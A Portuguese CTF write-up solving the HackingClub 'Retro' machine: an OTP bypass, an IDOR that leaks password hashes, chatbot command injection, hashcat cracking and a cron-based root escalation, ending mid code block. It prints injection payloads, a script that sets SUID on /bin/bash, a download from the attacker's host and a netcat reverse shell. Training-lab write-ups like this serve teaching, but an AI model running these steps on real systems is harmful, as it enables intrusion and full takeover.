---
title: "Retro - Desafio Hacker [HackingClub]"
description: 'Resolvendo a máquina Retro: Broken Access Control (JWT antes do OTP), IDOR vazando hashes, BFLA + Command Injection no chatbot, quebra de hash Django com hashcat e escalação de privilégios via cron + arquivo .smc.'
author: matheus
date: 2026-06-18 18:30:00 -0300
last_modified_at: 2026-06-18 18:30:00 -0300
categories: ["Segurança", "CTF e Writeups"]
tags: ["HackingClub", "WriteUps", "Broken Access Control", "IDOR", "JWT", "hashcat", "Command Injection", "privilege escalation", "cron"]
pin: false
comments: true
image: /assets/img/covers/retro-writeup.png
---

## Introdução

A **Retro** é uma máquina Linux do HackingClub que gira em torno de uma aplicação web com cara de fórum de jogos arcade, o tal **"Arcade Games News Forum"**. Por trás do visual nostálgico mora um **backend em Django** cheio de decisões de segurança erradas que, somadas, abrem um caminho limpo do "usuário anônimo" até **root**.

O que eu mais gosto nessa máquina é que ela não depende de CVE mágico nem de exploit pronto. É **lógica de aplicação** do começo ao fim. Você precisa *entender o fluxo* (cadastro, login, OTP, dashboard, perfil, chatbot) pra enxergar onde cada peça está quebrada. Por isso, mais do que listar comandos, eu vou explicar **por que** dei cada passo, que é o que faz diferença quando você for resolver sozinho depois.

A cadeia completa é:

> **Broken Access Control** (o token JWT nasce antes da verificação por OTP), **IDOR** no endpoint de perfil vazando o hash de outros usuários, **BFLA + Command Injection** no chatbot (que dá RCE até com a conta gratuita), **user flag**, e por fim **escalação de privilégios** por um script que roda como root via cron e executa um arquivo `.smc` que eu controlo, **root flag**. A quebra do hash do admin (Django PBKDF2) entra como caminho alternativo.
{: .prompt-info }

- **Alvo:** `172.16.13.125`
- **Domínio:** `retro.hc`
- **Dificuldade:** média

> Como sempre, a graça tá na jornada, não só no destino. Se você só copiar as respostas sem entender o que está fazendo, não vai aprender nada. Então vem comigo entendendo o porquê de cada coisa.
{: .prompt-tip }

---

## 1. Reconhecimento

A primeira pergunta de qualquer máquina é: o que está rodando aí? É alguma aplicação web? Quais portas estão abertas e quais serviços respondem? A ferramenta pra isso é o **nmap**.

```bash
nmap -sC -sV -p- --min-rate 2000 172.16.13.125
```

**Explico cada parâmetro:**
- `-sC` roda os *scripts padrão* do nmap (NSE), que já fazem checagens rápidas (banner, título HTTP, chaves SSH...).
- `-sV` detecta a **versão** de cada serviço. É isso que permite caçar CVE por versão depois.
- `-p-` varre **todas** as 65.535 portas TCP, não só as 1000 mais comuns. Nunca confie só no top-1000.
- `--min-rate 2000` manda pelo menos 2000 pacotes por segundo, pra acelerar o scan completo.

**Resultado:**

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://retro.hc/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Duas portas:
- **22 (SSH)**, sem credenciais por enquanto, fica no banco de reserva.
- **80 (HTTP)**, nginx, e o nmap já entrega uma pista valiosa: *"Did not follow redirect to **http://retro.hc/**"*.

Ou seja, a aplicação responde por **nome de domínio** (`retro.hc`), não por IP. Se eu acessar pelo IP cru, o servidor me redireciona pra `retro.hc`, que o meu computador não sabe resolver (não existe esse DNS). A correção é mapear o domínio para o IP no arquivo de hosts:

```bash
sudo nano /etc/hosts
# adicione a linha (separe IP e nome com TAB ou espaço):
172.16.13.125   retro.hc
```

> **Por que isso importa?** Muita aplicação web só "se comporta" quando você bate pelo `Host` certo (virtual hosting). Sem esse mapeamento você vê uma página quebrada ou um redirect infinito e acha que a máquina está fora do ar. Mapeou o host, o site aparece.
{: .prompt-tip }

> Se você (como eu, neste writeup) preferir **não** mexer no `/etc/hosts`, dá pra resolver o domínio só na hora da requisição com `curl --resolve retro.hc:80:172.16.13.125 ...`. O efeito é o mesmo, e é prático pra automatizar. Mostro logo abaixo.
{: .prompt-info }

---

## 2. Enumeração web e o fluxo da aplicação

Com o `retro.hc` resolvendo, abro a aplicação no navegador. É um fórum sobre jogos retrô, com notícias de clássicos (Donkey Kong, TMNT, Super Metroid...) e um botão de **Login** no canto.

A primeira coisa que eu faço numa app dessas é **mapear o fluxo**: que telas existem e, principalmente, *como o front conversa com o back*. Eu tento o login com qualquer coisa e observo a requisição. Aqui fica claro que a autenticação não é um formulário tradicional que dá `POST` numa página PHP, ela fala com uma **API** em JSON:

```http
POST /api/login HTTP/1.1
Host: retro.hc
Content-Type: application/json

{"email":"matheus@hackingclub.com","password":"zzz"}
```

> **Um aviso que vale pra writeup inteira:** quase tudo que eu faço daqui pra frente com `curl` dá pra fazer **direto no navegador** ou só **observando o tráfego**. Pra ver essa requisição de login, por exemplo, basta abrir o **DevTools** (F12), ir na aba **Network**, marcar "Preserve log" e tentar logar: a chamada `POST /api/login` aparece ali, com corpo, headers e resposta. Quem usa **Burp Suite** (ou Charles) intercepta a mesma coisa no proxy e manda pro **Repeater** pra ir editando e reenviando à vontade. Eu escolhi `curl` neste writeup porque deixa as **respostas fáceis de mostrar e documentar** sem depender de print de DevTools/proxy, mas o raciocínio é idêntico: você está sempre olhando "o que o front mandou e o que o back respondeu".
{: .prompt-tip }

Achei uma **API**, então existe um conjunto de rotas sob `/api/` esperando pra ser descoberto. Dá pra continuar clicando pelo site, mas já está na hora de fuzzar pra ver tudo de uma vez.

### 2.1 Fuzzing das rotas da API

```bash
ffuf -u http://172.16.13.125/api/FUZZ -H "Host: retro.hc" \
     -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
     -mc 200,301,302,401,403,405
```

**Explico cada parâmetro:**
- `-u http://172.16.13.125/api/FUZZ` a palavra `FUZZ` é o ponto de injeção; o ffuf troca ela por cada entrada da wordlist.
- `-H "Host: retro.hc"` mando o `Host` certo apontando pro IP (mesma ideia do `--resolve`, sem precisar do `/etc/hosts`).
- `-w ...raft-large-words.txt` wordlist de nomes comuns de rotas e arquivos.
- `-mc 200,301,302,401,403,405` *match codes*, só me mostra respostas com esses status. O **405 (Method Not Allowed)** é precioso: significa "essa rota existe, mas o método GET não é aceito", o que quase sempre é um endpoint de API que espera POST.

**Resultado:**

```text
login      [Status: 405]
logout     [Status: 405]
register   [Status: 405]
chat       [Status: 301]
verify     [Status: 401]
```

O que isso me conta sobre o fluxo:
- `register` dá pra **criar conta** (vou precisar disso).
- `login` / `logout` autenticação.
- `verify` tem uma etapa de **verificação** (cheira a OTP/2FA).
- `chat` tem um **chatbot** em algum lugar.

> Repare que o `ffuf` não achou o `/api/profile/`. Ele é uma rota **parametrizada** (`/api/profile/{id}`), e wordlists genéricas não pegam isso. A gente chega nele observando o que o dashboard faz. Fuzzing acha o óbvio; o resto é observação.
{: .prompt-info }

---

## 3. Registro e o fluxo de autenticação

Como existe `register`, crio meu próprio usuário em vez de adivinhar credenciais. Daria pra fazer pela tela de cadastro do site; faço por `curl` pra registrar a resposta aqui:

```bash
curl --resolve retro.hc:80:172.16.13.125 \
     -X POST http://retro.hc/api/register \
     -H "Content-Type: application/json" \
     -d '{"name":"laidler","email":"laidler@hackingclub.com","password":"laidler123!"}'
```

> **Dica:** o `--resolve retro.hc:80:172.16.13.125` resolve o domínio pro IP **só dentro daquela requisição**. É a opção pra quem não quer mexer no `/etc/hosts`. Pelo navegador, com o host mapeado, é só preencher o formulário de cadastro normalmente.
{: .prompt-tip }

**Resposta:**

```json
{"status":"success","message":"User created successfully!"}
```

Conta criada. Agora o login (de novo, pela tela isso é só preencher e enviar; o que importa é a resposta):

```bash
curl --resolve retro.hc:80:172.16.13.125 \
     -X POST http://retro.hc/api/login \
     -H "Content-Type: application/json" \
     -d '{"email":"laidler@hackingclub.com","password":"laidler123!"}'
```

**Resposta:**

```json
{"status":"success","message":"Authentication performed successfully!",
 "x-access-token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<payload>.<assinatura>"}
```

A aplicação me devolveu um **JWT** no campo `x-access-token`. Guarda esse token, ele é a chave do que vem a seguir.

### O que é JWT?

**JWT (JSON Web Token)** é um "crachá" assinado pelo servidor. Ele tem 3 partes separadas por ponto: `header.payload.signature`. As duas primeiras são só **Base64**, ou seja, qualquer um lê (a assinatura é que impede você de **forjar** um token novo, mas ler o conteúdo é livre). Decodificando a parte do meio (o `payload`):

```bash
# a parte do meio do token é o payload, em base64:
echo '<parte-do-meio-do-token>' | base64 -d
```

```json
{"id":13,"email":"laidler@hackingclub.com","username":"laidler","plan":"Free","exp":1781808663,"iat":1781805063}
```

O token diz que sou o usuário `id:13`, `plan:"Free"`. Guarda dois detalhes: **eu tenho um `id`** (vai virar a chave do IDOR) e **eu sou "Free"** (vai importar no chatbot).

### O que é OTP, e onde ele entra?

Logo depois do login, a interface me joga numa tela **"Enter OTP"**, aquele código de 6 dígitos de verificação (um segundo fator, 2FA). É o endpoint `verify` que o ffuf achou. Em teoria, eu **não deveria** acessar nada autenticado até digitar o OTP correto.

E é exatamente aqui que mora a primeira falha grave.

---

## 4. Broken Access Control: o crachá nasce antes da catraca

Olhando com calma: a aplicação **já me entregou o JWT no login**, *antes* de eu provar o OTP. Pensa num prédio com catraca pra entender o problema:

- A **recepção** (o `/api/login`) já me dá o **crachá** (o JWT) assim que entro.
- A **catraca** (a verificação por OTP, no `/api/verify`) deveria ser o segundo obstáculo: só passa quem digita o código certo.
- A **porta do andar protegido** (a rota `/dashboard`) deveria checar se eu **passei pela catraca**.

O furo é que essa porta só olha se eu **tenho um crachá válido**, e não se eu **passei pela catraca**. Resultado: com o crachá que peguei na recepção, eu subo direto pro andar restrito ignorando a catraca. Traduzindo pro técnico: será que o `/dashboard` depende mesmo do OTP, ou só de ter o token? Vamos testar acessando direto, com o token que já tenho na mão:

```bash
curl --resolve retro.hc:80:172.16.13.125 -L \
     http://retro.hc/dashboard \
     -H "Cookie: token=<JWT>" -o /dev/null -w "%{http_code}\n"
```

```text
200
```

**200 OK.** Acessei o dashboard **sem nunca ter digitado o OTP**. A verificação de 2FA é puramente **client-side**: uma tela bonita que o front mostra, mas que o back não impõe em lugar nenhum. O OTP, na prática, não tranca nada.

> **Lição #1:** controle de acesso tem que ser validado **no servidor**, em cada rota sensível. Se a única coisa que segura o usuário é a tela do front, é o mesmo que trancar a porta e deixar a janela aberta. Nunca confie no client-side.
{: .prompt-warning }

Dentro do dashboard tem o fórum "Welcome to the Super Nintendo Forum" e, mais importante, a funcionalidade de **ver o próprio perfil**.

---

## 5. IDOR: vazando os hashes de todo mundo

Ao abrir o perfil, o front consome uma rota da API passando o **meu próprio id**. Dá pra ver isso na aba Network do DevTools ou no Burp; eu mostro com `curl`:

```http
GET /api/profile/13/ HTTP/1.1
Host: retro.hc
Cookie: token=<JWT>
```

```json
{"id":13,"username":"laidler","email":"laidler@hackingclub.com",
 "password":"pbkdf2_sha256$870000$Ov7dZBkufJoVuxKbmcAYqG$ivzAIz1dG5SkIJgTbnSVPhG+JQaYyhyAdVnU3JAMPcw=",
 "document":null,"birthOfDate":null,"plan":"Free"}
```

Duas coisas saltam aos olhos:
1. O endpoint tem um **`{id}` totalmente manipulável** na URL.
2. A resposta inclui o **hash da senha** e PII (documento, data de nascimento).

Isso é o caso de livro de **IDOR (Insecure Direct Object Reference)**: o servidor entrega o objeto pedido pelo id **sem checar se aquele objeto é seu**. Se eu trocar o `13` por `1`, `2`, `3`..., vejo o perfil dos outros.

> **Detalhe técnico que me custou um tempinho:** a rota **exige a barra final**. `GET /api/profile/13` (sem barra) responde **301** (redirect) com corpo vazio; `GET /api/profile/13/` (com barra) responde **200** com os dados. É o `APPEND_SLASH` padrão do Django. Sempre teste as duas formas.
{: .prompt-tip }

Pra enumerar os ids eu poderia clicar perfil por perfil, mas é exatamente o tipo de tarefa repetitiva que um laço resolve. Automatizando:

```bash
for id in $(seq 1 25); do
  echo "--- id=$id ---"
  curl -s --resolve retro.hc:80:172.16.13.125 \
       "http://retro.hc/api/profile/$id/" -H "Cookie: token=<JWT>"
  echo
done
```

> **Sobre o nome da variável:** chamei de `id` (e não de `i`) de propósito. Em script de uma linha rápida tudo bem usar `i`, mas dar um nome que **diz o que a variável é** facilita ler e lembrar do que se trata, ainda mais quando o trecho vai pra um writeup que outra pessoa vai ler. `for id in ...` já se explica sozinho.
{: .prompt-info }

**Achados importantes:**

```text
id=5  -> John Doe        | john.doe@games.com       | plan=premium | hash=pbkdf2_sha256$870000$a5aDVagtfVrJs2QYI4OHsx$5MKgvpryxR+...
id=7  -> Michael Johnson | michael.johnson@games.com | plan=premium | hash=pbkdf2_sha256$870000$a5aDVagtfVrJs2QYI4OHsx$5MKgvpryxR+...
id=9  -> David Wilson    | david.wilson@games.com    | plan=premium | hash=pbkdf2_sha256$870000$a5aDVagtfVrJs2QYI4OHsx$5MKgvpryxR+...
id=11 -> James Miller    | james.miller@games.com    | plan=premium | hash=pbkdf2_sha256$870000$a5aDVagtfVrJs2QYI4OHsx$5MKgvpryxR+...
id=12 -> mike            | ronin@games.com           | plan=premium | hash=pbkdf2_sha256$870000$dP3w0oHfJtoxIVKlASLurB$TFqPG3GBxv...
```

Repara num detalhe interessante: os ids **5, 7, 9 e 11** são `premium` mas têm **exatamente o mesmo hash**, são contas de *seed* (povoamento) com a mesma senha (e até o mesmo salt, mais sobre isso já já). Já o **id 12 (`mike` / `ronin@games.com`)** tem um **hash único**. Anota o ronin, ele vai voltar.

> **O impacto, do ponto de vista de quem reporta:** esse IDOR sozinho já é grave. Ele expõe **hash de senha e dados pessoais de todos os usuários**. Num programa real isso é vazamento de dados sensíveis, independente de você quebrar hash ou não.
{: .prompt-warning }

---

## 6. Chatbot: RCE com a conta gratuita (BFLA) e a user flag

Antes de pensar em quebrar a senha de alguém, vale uma regra de bom senso: **num pentest de verdade você não sai quebrando o hash da senha alheia**. Quebrar a senha de outro usuário é, na prática, comprometer a conta de uma pessoa, algo que costuma estar fora de escopo e que você evita. O que um pentester faz é **continuar a exploração** com o que já tem. E é aí que esta máquina recompensa quem olha o fluxo: o chatbot é acessível **mesmo com a conta gratuita**.

### 6.1 BFLA: a página é restrita, a API não

A *página* `/chatbot/` realmente bloqueia o usuário Free:

```text
GET /chatbot/  ->  HTTP 403 Forbidden
```

Mas o **endpoint da API** que essa página consome **não valida o plano**:

```bash
# com o token do usuário "Free" (laidler), o mesmo do login lá em cima:
curl -s --resolve retro.hc:80:172.16.13.125 \
     -X POST http://retro.hc/api/chat/ \
     -H "Content-Type: application/json" -H "Cookie: token=<JWT_FREE>" \
     -d '{"message":"hello"}'
```

```json
{"response": "Hello, how are you? I'm still learning new things!"}
```

**200 OK, mesmo sendo Free.** Isso é **BFLA (Broken Function Level Authorization)**: a autorização foi colocada só na **renderização da página**, não na **função da API**. A página esconde o botão, mas o endpoint atende qualquer usuário logado. Conclusão prática: dá pra usar o chatbot, e explorá-lo, **sem precisar da conta do ronin**.

### 6.2 A injeção, e o filtro que a aplicação tenta impor

Mexendo no campo `message`, percebi que o backend **avalia substituição de comando por crase** (`` `comando` ``):

```bash
curl -s --resolve retro.hc:80:172.16.13.125 \
     -X POST http://retro.hc/api/chat/ \
     -H "Content-Type: application/json" -H "Cookie: token=<JWT>" \
     -d '{"message":"`id`"}'
```

```json
{"response": " uid=1001(appuser) gid=1001(appuser) groups=1001(appuser)"}
```

**Command Injection confirmada.** Estamos rodando comandos como o usuário `appuser`. A mensagem é embutida num comando de shell no servidor, e a crase dispara a *command substitution* (o shell executa o que está entre crases e troca pelo resultado).

Só que a aplicação **tem uma defesa**: um filtro que **remove caracteres especiais** da mensagem antes de mandar pro shell. Pra saber exatamente o que dá e o que não dá, eu testei caractere por caractere, mandando `echo "..."` e olhando o que voltava:

```text
`echo "host:port a:b"`     ->  " hostport ab"        os dois-pontos (:) sumiram
`echo "test #x $y end"`    ->  " test x y end"        o # e o $ sumiram
`echo "AAA\nBBB"`          ->  " AAAnBBB"             a barra invertida (\) sumiu
`echo "aspas duplas ok"`   ->  " aspas duplas ok"     as aspas duplas (") sobreviveram
```

Repara no último: as **aspas duplas passam intactas**, mas tudo que é operador de shell some. Cruzando todos os testes, o filtro derruba: `| > < ; & ( ) ' { } % \ # $ :`. Ou seja:

- a **crase** escapou do filtro (é o nosso vetor);
- **aspas duplas** sobrevivem;
- mas **não dá** pra usar pipe/redirect/`;`/`&&`, nem `$()`, nem `'`, e (importante pra frente) nem `#` nem `:`.

Na prática, só rodo **comandos simples** (binário mais argumentos). Sem `#` e sem quebra de linha eu não consigo **escrever** um script com `#!/bin/bash`, e sem `:` não monto uma URL com porta. Guarda isso, vai ditar **como** a gente entrega o payload na escalação.

> **Lição #2:** sanitização por *blacklist* (listar o que proibir) é uma corrida perdida, sempre escapa um caractere (aqui, a crase). O certo é **não jogar input do usuário num shell**. Se precisar executar algo, use APIs que recebem os argumentos em lista, sem shell (ex.: `subprocess.run(["bin","arg"])`), e valide contra uma *allowlist*.
{: .prompt-warning }

### 6.3 A user flag

Com RCE como `appuser`, é só ler a flag (um comando simples, sem operadores):

```bash
-d '{"message":"`cat /home/appuser/user.txt`"}'
```

```json
{"response": " hackingclub{499623474d7463c261c8f48ddb427a9d}"}
```

> 🚩 **USER FLAG:** `hackingclub{499623474d7463c261c8f48ddb427a9d}`
{: .prompt-tip }

Repara que cheguei na user flag **sem quebrar senha de ninguém**, só explorando o BFLA + a injeção. Esse é o caminho mais próximo do que você faria num alvo real.

---

## 7. Quebrando o hash do admin (caminho alternativo, e a prova do impacto)

Lá no IDOR a gente guardou o hash único do `ronin` (id 12). Quebrá-lo **não é necessário** pra avançar (já temos RCE), mas vale por dois motivos:

1. **É a forma do writeup oficial do desafio** de chegar ao chatbot: virando o usuário premium "de verdade".
2. Em CTF, quando aparece **um hash diferente dos outros**, quase sempre é o que o desafio quer que você quebre, e costuma ser uma senha fraca que está na wordlist (então quebra rápido).

E tem um detalhe que torna isso legítimo até num cenário real: se aquela conta premium fosse uma **segunda conta sua** (uma técnica comum, criar duas contas pra testar acesso entre elas), quebrar o hash dela prova não só o IDOR, mas o **impacto combinado**: a senha vazou *e* o hash é fraco o suficiente pra ser revertido. Isso sobe a severidade do report.

### O que é um hash, e o formato do Django

Um **hash** é o resultado de uma função de mão única: você joga a senha dentro e sai uma sequência de tamanho fixo, sem caminho de volta. Servidores guardam o **hash** da senha (nunca a senha em texto puro), e na hora do login refazem o hash do que você digitou e comparam. "Quebrar" um hash não é desfazê-lo (não dá), é **testar milhões de senhas candidatas**, fazer o hash de cada uma e ver qual bate.

O Django guarda a senha num formato com tudo embutido, separado por `$`:

```text
pbkdf2_sha256 $ 870000 $ <salt> $ <hash em base64>
   algoritmo    iterações
```

- **`pbkdf2_sha256`** é o algoritmo. O **PBKDF2** repete o SHA-256 de propósito **870.000 vezes**, pra deixar cada tentativa **lenta** e tornar o brute-force caro.
- **`870000`** é o número de iterações (o "custo").
- **`<salt>`** é um valor **aleatório por usuário**, guardado junto. Ele serve pra duas pessoas com a senha igual terem hashes **diferentes**, e pra matar **rainbow tables** (tabelas prontas de hash para senha). Lembra que os usuários de seed (5, 7, 9, 11) tinham o **hash inteiro igual**? Isso significa que reaproveitaram **a senha e o salt**, um erro: o salt deveria ser único por usuário.
- **`<hash>`** é o resultado final.

### Quebrando com hashcat

Primeiro eu salvo o hash completo (a string `pbkdf2_sha256$...` inteira) num arquivo. O hashcat lê o hash de um arquivo, então:

```bash
echo 'pbkdf2_sha256$870000$dP3w0oHfJtoxIVKlASLurB$TFqPG3GBxvmww9Bf4uG65FXJOkwZI7oLF3XQL50id+w=' > hash.txt
```

Não sei de cabeça o "modo" desse hash no hashcat, então deixo a própria ferramenta identificar:

```bash
hashcat --identify hash.txt
```

```text
10000 | Django (PBKDF2-SHA256) | Framework
```

O modo é **10000**. Agora o ataque de dicionário com a rockyou:

```bash
hashcat -m 10000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Explico cada parâmetro:**
- `-m 10000` o **modo** de hash, "Django (PBKDF2-SHA256)", que o `--identify` apontou.
- `-a 0` *attack mode 0*, ataque de dicionário (testa palavra por palavra da wordlist).
- `hash.txt` o arquivo com o hash que acabei de salvar.
- `/usr/share/wordlists/rockyou.txt` a wordlist clássica de senhas vazadas (no Kali costuma vir compactada como `rockyou.txt.gz`, basta `gunzip`).

**Resultado:**

```text
pbkdf2_sha256$870000$dP3w0oHfJtoxIVKlASLurB$TFqPG3GBxvmww9Bf4uG65FXJOkwZI7oLF3XQL50id+w=:kingkong
Status...........: Cracked
```

A senha do `ronin@games.com` é **`kingkong`**. Mesmo com 870 mil iterações, ela estava lá no topo da rockyou e caiu em segundos. Iteração alta não salva senha fraca.

Logando como `ronin`, eu chego no mesmo chatbot, agora como usuário premium "de verdade":

```bash
curl -s --resolve retro.hc:80:172.16.13.125 \
     -X POST http://retro.hc/api/login \
     -H "Content-Type: application/json" \
     -d '{"email":"ronin@games.com","password":"kingkong"}'
```

Ou seja, dois caminhos chegam na mesma RCE: o **realista** (BFLA com a conta Free) e o **do gabarito** (quebrar o hash e virar premium). Daqui pra frente tanto faz qual conta usei, eu tenho execução de comando como `appuser`.

---

## 8. Escalação de privilégios: o "SNES Loader" que roda como root

Com a RCE em mãos, vou explorar o `appuser`. Listando a home dele:

```bash
-d '{"message":"`ls -la /home/appuser`"}'
```

```text
drwxr-x--- 6 appuser appuser 4096 .
drwxr-x--- 2 root    root    4096 roms
-rw-r--r-- 1 root    root      46 user.txt
-rw-r--r-- 1 root    root     994 verification_rom.py
```

Antes de sair correndo, vamos **ler as permissões**, porque elas contam a história toda. A primeira coluna mostra dono, grupo e permissões:

- **`verification_rom.py`** é `-rw-r--r--` e pertence a **`root root`**. Traduzindo: dono é o root, e os últimos `r--` dizem que **qualquer usuário pode ler** (por isso eu, `appuser`, consigo abrir e revisar o código). Eu **não** posso editar (não tenho `w`), e quem executa é o root. Já é um forte sinal de que é um script do root.
- **`user.txt`** segue a mesma lógica: `-rw-r--r-- root root`, do root mas legível por todos, foi assim que o `cat` funcionou na seção anterior.
- **`roms`** é um diretório `drwxr-x---` de **`root root`**. O "others" aqui é `---` (nada), então eu não entro nem listo o conteúdo dele.

O `verification_rom.py` ser do root e legível chamou atenção. Vou ler:

### 8.1 Revisando o `verification_rom.py`

```python
import os
import subprocess
import time

def is_valid_rom(file_name):
    return file_name.endswith('.smc')

def load_roms():
    rom_source = '/home/appuser/roms'

    if not os.path.exists(rom_source):
        print("[SNES Loader] No ROMs found in the directory. Creating default directory.")
        os.makedirs(rom_source, exist_ok=True)
        return

    for rom in os.listdir(rom_source):
        rom_path = os.path.join(rom_source, rom)

        if os.path.isfile(rom_path) and is_valid_rom(rom):
            try:
                subprocess.run(["snes-emulator", rom_path], check=True)
            except FileNotFoundError:
                print("[SNES Loader] Emulator not found, running ROM directly...")
                subprocess.run([rom_path], check=True)

    print('[SNES Loader] All ROM files have been processed.')

load_roms()
```

> **O que é SNES, ROM e `.smc`?** SNES é o **Super Nintendo**. Uma **ROM** é o arquivo que contém o jogo (a "cópia do cartucho") que um emulador carrega pra rodar. No SNES, a extensão típica desses arquivos é **`.smc`**. Por isso o script só processa arquivos terminados em `.smc`: ele se faz de "carregador de ROMs de Super Nintendo".
{: .prompt-info }

Esse script é executado **como root, de tempos em tempos, por um cron** (na prática rodou em menos de um minuto).

> **O que é cron?** O **cron** é o agendador de tarefas do Linux. Ele dispara comandos e scripts em intervalos definidos (a cada minuto, toda madrugada, etc.) sem ninguém precisar rodar na mão. Como o cron costuma rodar como **root**, qualquer script chamado por ele herda esse poder. É um vetor de escalação clássico: ache um script que o root executa e que você consegue influenciar.
{: .prompt-info }

Lendo a lógica com olhos de atacante, a parte que interessa é o `for`:

```python
for rom in os.listdir(rom_source):          # 1. lista os arquivos em /home/appuser/roms
    rom_path = os.path.join(rom_source, rom)
    if os.path.isfile(rom_path) and is_valid_rom(rom):   # 2. se for arquivo e terminar em .smc
        try:
            subprocess.run(["snes-emulator", rom_path], check=True)   # 3. tenta abrir no emulador
        except FileNotFoundError:
            subprocess.run([rom_path], check=True)        # 4. emulador não existe? EXECUTA o .smc direto
```

1. Ele lista os arquivos de `/home/appuser/roms`.
2. Pra cada um que termina em `.smc`...
3. ...tenta abrir com o `snes-emulator`. Só que esse binário **não existe** na máquina (`which snes-emulator` volta vazio).
4. Como o emulador não existe, o `except FileNotFoundError` cai no plano B: `subprocess.run([rom_path])`, que **executa o próprio arquivo `.smc` diretamente**, e como o script roda como root, **o `.smc` roda como root**.

Resumindo o achado: se eu colocar um `.smc` executável em `/home/appuser/roms`, o cron vai rodá-lo como root.

### 8.2 O detalhe de permissões que torna isso possível

```text
drwxr-x--- 2 root    root     roms            <- root é dono; eu (appuser) não entro
drwxr-x--- 6 appuser appuser  /home/appuser   <- mas a home é MINHA
```

O `roms` é do root e eu não escrevo **dentro** dele. O pulo do gato é que eu **sou dono do diretório pai** (`/home/appuser`). E no Linux, **apagar ou criar um subdiretório depende da permissão de escrita no diretório PAI, não de quem é dono do subdiretório**. Então eu posso **apagar o `roms` e recriá-lo como meu**:

```bash
`rm -rf /home/appuser/roms`
`mkdir /home/appuser/roms`
```

O próprio script ainda colabora: lembra do `if not os.path.exists(rom_source)`? Se o diretório some, ele recria. Mas como o `roms` agora foi recriado por mim, **eu mando nele** e posso plantar o `.smc`.

### 8.3 Montando o payload e o servidor de entrega

Aqui o filtro de caracteres da seção 6.2 cobra o preço: sem `#` e sem quebra de linha, eu **não consigo escrever** o script `#!/bin/bash` direto pela injeção (o `#` some, e não tenho como criar linhas). A saída é clássica: **hospedar o arquivo num servidor HTTP meu e mandar o alvo baixar**, porque `curl`/`wget` são comandos simples, sem operador proibido.

Na **minha máquina** (o Kali, no IP da VPN `10.0.30.175`), eu crio o `run.smc` e subo um servidor HTTP. Como o filtro do alvo também remove o `:`, eu vou precisar baixar por uma URL **sem `:`**, então sirvo na **porta 80** (a porta HTTP padrão dispensa o `:porta` na URL):

```bash
# 1) crio a pasta e o payload
mkdir -p /tmp/www
cat > /tmp/www/run.smc <<'EOF'
#!/bin/bash
cp /root/root.txt /tmp/rootflag.txt      # copia a root flag pra um lugar que eu consigo ler
chmod 644 /tmp/rootflag.txt
chmod +s /bin/bash                        # liga o bit SUID no /bin/bash
EOF

# 2) subo o servidor na porta 80 (precisa de sudo pra portas abaixo de 1024)
sudo python3 -m http.server 80 --bind 10.0.30.175 --directory /tmp/www
```

**Explico cada parâmetro do servidor:**
- `python3 -m http.server` o servidor HTTP embutido do Python.
- `80` a porta. Como é a porta padrão de HTTP, a URL pode ser `http://10.0.30.175/run.smc`, **sem `:porta`** (que o filtro removeria).
- `--bind 10.0.30.175` escuta no IP da VPN, o IP pelo qual o alvo me alcança.
- `--directory /tmp/www` serve os arquivos dessa pasta.
- `sudo` necessário porque portas abaixo de 1024 são privilegiadas.

Agora, **pela injeção no chatbot**, eu apago e recrio o `roms`, baixo o payload pra dentro dele e marco como executável. Cada linha é um comando simples (sem operador, sem `:`, baixando pela porta 80):

```bash
`rm -rf /home/appuser/roms`
`mkdir /home/appuser/roms`
`curl 10.0.30.175/run.smc -o /home/appuser/roms/run.smc`
`chmod 755 /home/appuser/roms/run.smc`
```

Conferindo que ficou tudo no lugar:

```bash
-d '{"message":"`ls -la /home/appuser/roms`"}'
```

```text
drwxr-xr-x 2 appuser appuser 4096 .
-rwxr-xr-x 1 appuser appuser  246 run.smc
```

> **Outra forma de fazer isso** (é a mesma do writeup oficial do desafio): em vez de entregar o `.smc` por HTTP, abrir uma **reverse shell**. Na sua máquina você deixa um ouvinte com `nc -lvnp 4444`; pela injeção você dispara `` `busybox nc 10.0.30.175 4444 -e /bin/bash` `` (é um comando simples, sem caractere filtrado, e o `busybox nc -e` conecta de volta e gruda um `/bin/bash` no socket). Caindo a conexão, você tem um **shell interativo de verdade** como `appuser`, onde os operadores de shell **funcionam normalmente** (o filtro do chatbot não existe ali). Aí dá pra escrever o `.smc` direto, sem precisar de servidor HTTP, por exemplo com `printf '#!/bin/bash\nchmod +s /bin/bash\n' > /home/appuser/roms/run.smc`. Vale ainda estabilizar o shell com `python3 -c 'import pty;pty.spawn("/bin/bash")'` pra ter setas, Tab e Ctrl+C. Os dois caminhos chegam no mesmo ponto; eu usei a entrega por HTTP por ser 100% pela própria injeção, mas a reverse shell é mais confortável pra tocar a escalação na mão.
{: .prompt-info }

### 8.4 Esperando o cron e pegando root

Agora é esperar o "SNES Loader" rodar. Em menos de um minuto, checo as permissões do `/bin/bash`:

```bash
-d '{"message":"`ls -la /bin/bash`"}'
```

```text
-rwsr-sr-x 1 root root 1446024 /bin/bash
```

Apareceu o **`s`** no lugar do `x` do dono. O `chmod +s` rodou (como root, via cron) e o `/bin/bash` agora é **SUID root**.

> **O que é SUID, e por que isso me dá root?** O bit **SUID (Set User ID)** faz um binário rodar com os privilégios do **dono do arquivo**, não de quem o executou. Você vê isso no `s` que aparece no lugar do `x` do dono (`-rwsr-xr-x`). Existe pra casos legítimos: o `/usr/bin/passwd`, por exemplo, precisa escrever no `/etc/shadow` (que é só do root), então ele é SUID root pra qualquer usuário conseguir trocar a própria senha. O perigo é quando um binário SUID root permite executar comandos arbitrários. Com o `/bin/bash` SUID root, eu literalmente abro um shell com poderes de root. Só tem um pulo: o bash, por segurança, **abandona** os privilégios elevados ao iniciar, a menos que você passe a flag **`-p`** (de *preserve privileges*). Com `-p`, o `euid` (o usuário "efetivo", o que vale pras permissões) fica 0:
{: .prompt-info }

```bash
-d '{"message":"`/bin/bash -p -c id`"}'
```

```text
uid=1001(appuser) gid=1001(appuser) euid=0(root) egid=0(root) groups=0(root),1001(appuser)
```

**`euid=0(root)`**, execução como root confirmada. E o meu `run.smc` já tinha copiado a flag pra um lugar legível, então é só ler:

```bash
